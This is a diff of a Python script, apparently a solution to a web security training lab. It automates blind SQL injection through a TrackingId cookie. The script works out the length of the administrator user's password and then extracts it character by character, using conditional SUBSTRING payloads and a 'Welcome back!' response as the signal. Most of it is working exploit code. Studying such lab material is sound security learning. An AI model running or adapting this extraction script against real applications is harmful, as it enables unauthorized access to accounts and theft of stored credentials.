@@ -6,9 +6,7 @@ proxies = {'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}
 
 
 def fire_payload(cookies, url):
-    # print(cookies)
     if "Welcome back!" in requests.get(url=url, cookies=cookies).text:
-    # if "Welcome back!" in requests.get(url=url, cookies=cookies, proxies=proxies).text:
         return True
 
 
@@ -22,8 +20,21 @@ def username(cookies, url):
 
 
 def pw_take(url, cookies, length):
-    for i in range(length):
-        print(i)
+    pw = ''
+    pos = 1
+    charset = string.digits + string.ascii_letters
+    while pos <= length:
+        for char in charset:
+            #payload = f"' AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')='{char}"
+            payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {pos}, 1) = '{char}"
+            temp_cookies = cookies.copy()
+            temp_cookies['TrackingId'] += payload
+            print(f"[-] Password = {pw + char}", flush=True, end="\r")
+            if fire_payload(temp_cookies, url):
+                pw += char
+                pos += 1
+                break
+    print(f"[+] Password = {pw}", flush=True)
 
 
 def pw_length(url, cookies):
@@ -31,16 +42,16 @@ def pw_length(url, cookies):
         payload = f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{i})='a"
         temp_cookies = cookies.copy()
         temp_cookies['TrackingId'] += payload
-        print(f"[+] Testing pw length = {i}",flush=True, end="\r")
+        print(f"[-] Testing pw length = {i}",flush=True, end="\r")
         if not fire_payload(temp_cookies, url):
-            print(f"[+] Testing pw length = {i}")
+            print(f"[-] Testing pw length = {i}")
             return i
 
 
 if __name__ == "__main__":
     try:
-        # url = sys.argv[1].strip()
-        url = "https://ac391f6e1f704cd380f61b22004d00eb.web-security-academy.net/"
+        url = sys.argv[1].strip()
+        # url = "https://ac561fd61f9b46b1804821df004100ab.web-security-academy.net/"
     except IndexError:
         print(f"[-] Usage: {sys.argv[0]} <url>")
         print(f"[-] Example: {sys.argv[0]} http://web-security-academy.net/")
